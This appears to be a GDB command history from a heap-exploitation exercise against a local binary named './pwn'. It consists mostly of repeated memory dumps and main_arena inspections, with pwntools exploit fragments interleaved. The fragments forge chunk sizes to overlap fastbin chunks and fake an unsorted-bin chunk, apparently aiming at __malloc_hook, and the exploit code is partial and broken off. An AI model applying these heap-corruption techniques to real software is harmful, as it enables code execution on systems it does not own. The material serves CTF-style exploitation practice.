x /20gx 0x7ffff7dd1ad4
x /20gx 0x7ffff7dd1ad4
x /20gx 0x7ffff7dd1adf
x /20gx 0x7ffff7dd1adc
p &__malloc_hook
c
l
vmmap
x /20gx 0x0000555555757000
p main_arena.fastbinsY 
x /20g 0x555555757090
c
x /20g 0x555555757000
c
x /20g 0x555555757000
p main_arena.fastbinsY 
x /20gx 0x555555757090
c
x /20gx 0x555555757090
c
x /20gx 0x555555757090
p main_arena.f
p main_arena.fastbinsY 
c
p main_arena.fastbinsY 
c
c
x /20gx 0x555555757090
x /20gx 0x555555757000
c
bt
/20gx 0x00007ffff7a42428
x /20gx 0x00007ffff7a42428
x /20i 0x00007ffff7a42428
c
c
vmmap
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /20gx 0x00005555557570e0
x /20gx 0x0000555555757010
vmmap
x /80gx 0x0000555555757000
c
c
vmmap
x /80g 0x0000555555757000
l
b 8
r
vmmap
x /20gx 0x00602000
x /20gx 0x006020f0
vmmap
x /80gx 0x0000555555757000
c
bt
c
p p=process('./pwn')
create(0,0x18,"0")
#0x30
create(1,0x60,"0")
#0xa0
create(2,0x60,"0")
#0x110
create(3,0x60,"0")
delete(1)
delete(2)
# overlapping 
payload = p64(0x0)+p64(0x71)
rename(0,payload)
move = '\x10'
rename(2,move)
create(2,0x60,"0")
#0x20 
create(4,0x60,"0")
#fake unsorted size
pay2 = p64(0) + p64(0xe1)
rename(0,pay2)
#padding unsorted bin next chunk pre_use 
padding = p64(0x0)*0xa+p64(0x0) + p64(0xe1)
rename(2,padding)
x /20gx 0x555555554949
x /20i 0x555555554949
vmmap
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
p main_arena.fastbinsY 
c
p main_arena.fastbinsY 
p main_arena.fastbinsY 
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
p main_arena.fastbinsY 
p main_arena.bins[1]
c
x /40gx 0x0000555555757000
x /20gx 0x00005555557525dd
c
x /40gx 0x0000555555757000
vmmap
x /40gx 0x0000555555757000
c
vmmap
x /40gx 0x0000555555757000
c
vmmap
x /40gx 0x0000555555757000
p main_arena.fastbinsY 
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
p main_arena.fastbinsY 
c
vmmap
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
p &malloc_hook
p &_malloc_hook
p __malloc_hook 
p &__malloc_hook 
x /40gx 0x0000555555757000
x /20gx 0x00007ffff7dd1aed
c
x /40gx 0x0000555555757000
p main_arena.bins[1]
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
x /20gx 0x00007ffff7dd1b10
x /20gx 0x00007ffff7dd1aeb
x /20gx 0x00007ffff7dd1aed
c
x /20gx 0x00007ffff7dd1aed
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
c
x /40gx 0x0000555555757000
pad3 = p64(0x0) + p64(0x71)
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
x /40gx 0x0000555555757000
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
c
vmmap
x /40gx 0x0000555555757000
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
set {long long}0x555555757018=0xe1
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
x /40gx 0x0000555555757000
c
vmmap
/40gx from pwn import *
context.log_level = 'debug'
def create(idx,size,name):
p.sendline("1")
p.recv()
p.sendline(str(size))
p.recv()
p.sendline(str(idx))
p.recv()
p.send(name)
p.recv()
def delete(idx):
p.sendline("2")
p.recv()
p.sendline(str(idx))
p.recv()
def rename(idx,data):
p.sendline("3")
p.recv()
p.sendline(str(idx))
p.recv()
p.send(data)
p.recv()
p=process('./pwn')
create(0,0x18,"0")
#0x30
create(1,0x60,"0")
#0xa0
create(2,0x50,"0")
#0x100
create(3,0x60,"0")
delete(1)
delete(2)
# overlapping 
payload = p64(0x0)+p64(0x71)
rename(0,payload)
move = '\x10'
rename(2,move)
create(2,0x60,"0")
#0x20 
create(4,0x60,"0")
#fake unsorted size
pay2 = p64(0) + p64(0xe1)
vmmap
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
c
x /40gx 0x0000555555757000
